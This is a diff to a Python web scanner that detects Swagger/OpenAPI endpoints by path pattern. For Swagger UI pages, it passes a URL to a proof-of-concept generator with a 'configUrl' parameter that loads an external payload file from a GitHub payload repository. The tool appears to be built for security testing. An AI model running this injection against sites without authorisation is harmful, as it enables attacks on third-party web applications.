@@ -33,11 +33,23 @@ def test_endpoint(url, error_content, verbose, user_agent):
             # Calculate similarity with the error content
             similarity = difflib.SequenceMatcher(None, error_content, response.text).ratio()
             if similarity < 0.90:
-                if '/swagger-ui/index.html' in url:
+                # Check for various Swagger/OpenAPI endpoints
+                swagger_patterns = ['/swagger-ui', '/api-docs', '/openapi', '/swagger.', '/swagger-resources']
+                is_swagger = any(pattern in url for pattern in swagger_patterns)
+                
+                if is_swagger:
                     print(f"Calling PoC generator for {url}")
                     current_dir = os.path.dirname(os.path.abspath(__file__))
                     pocgenerator_path = os.path.join(current_dir, 'pocgenerator.py')
-                    subprocess.run(['python3', pocgenerator_path, url+"?configUrl=https://raw.githubusercontent.com/brinhosa/payloads/master/testswagger.json"])
+                    
+                    # Add configUrl parameter for Swagger UI endpoints
+                    endpoint_url = url
+                    if '/swagger-ui' in url:
+                        endpoint_url += "?configUrl=https://raw.githubusercontent.com/brinhosa/payloads/master/testswagger.json"
+                    
+                    # Pass the SCREENSHOT_PATH environment variable if it exists
+                    env = os.environ.copy()
+                    subprocess.run(['python3', pocgenerator_path, endpoint_url], env=env)
                 return url
     except requests.RequestException as e:
         pass
